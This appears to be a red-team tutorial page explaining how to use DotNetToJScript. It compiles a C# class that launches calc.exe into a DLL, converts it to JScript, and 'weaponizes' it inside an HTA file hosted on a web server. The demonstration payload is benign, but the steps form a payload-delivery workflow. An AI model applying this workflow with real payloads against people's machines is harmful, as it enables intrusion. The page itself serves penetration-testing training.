# JS files - DotNetToJScript

## JS files - DotNetToJScript

### Usage

* **Create a simple C# program (public class...)**

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

public class Hello
{
    public void Hellocal()
        {
            Process.Start("calc.exe");
            System.Windows.Forms.MessageBox.Show("hello from calc");


        }
}


```

Note the Class and the method name

![](<../../../../.gitbook/assets/image (297).png>)

* **Compile it as a library:**

```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /platform:x86 /target:library hellocalc.cs
```

![](<../../../../.gitbook/assets/image (124).png>)

* **Download latest DotNetToJScript and compile it (x86 for x86 payload ...)**

```csharp
 git clone https://github.com/tyranid/DotNetToJScript
```

* **Execute DotNetToJScript specify the Class name, an ouput file and the DLL.**

```
 .\DotNetToJScript.exe -l JScript -c Hello -o output.txt .\hello.dll
```

* **Edit the output and add the method**

![](<../../../../.gitbook/assets/image (48).png>)

### HTA Weaponize&#x20;

* **Add the edited output.txt to your HTA file :**

![](<../../../../.gitbook/assets/image (152).png>)

![](<../../../../.gitbook/assets/image (123).png>)

* **Host the file on a webserver :**

![](<../../../../.gitbook/assets/image (135).png>)

![](<../../../../.gitbook/assets/image (106).png>)

###
